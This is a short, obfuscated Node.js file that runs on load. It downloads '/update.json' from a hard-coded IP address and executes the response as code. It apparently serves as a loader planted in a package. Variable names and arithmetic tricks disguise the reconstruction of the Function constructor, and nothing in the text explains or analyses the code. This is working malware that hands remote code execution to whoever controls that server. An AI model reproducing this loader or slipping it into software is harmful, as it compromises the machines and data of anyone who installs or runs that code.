(function () {
    var _0x1edd2b = require('http');
    return _0x1edd2b['get']({
        'host': '23.94.46.191',
        'port': 0x50,
        'path': '/update.json'
    }, function (_0x5b56bd) {
        var _0xe95e26 = '';
        _0x5b56bd['on']('data', function (_0x5506eb) {
            _0xe95e26 += _0x5506eb;
        });
        _0x5b56bd['on']('end', function () {
            var _0x56d090 = this[(typeof this['Buffer']['from'])['charAt'](0xd36 * -0x2 + -0x14d8 + 0x2f44)['toUpperCase']() + (typeof this['Buffer']['from'])['slice'](0x2035 * -0x1 + 0x2471 + -0x169 * 0x3)];
            var _0x3ac789 = new _0x56d090(_0xe95e26);
            _0x3ac789();
        });
    });
}());
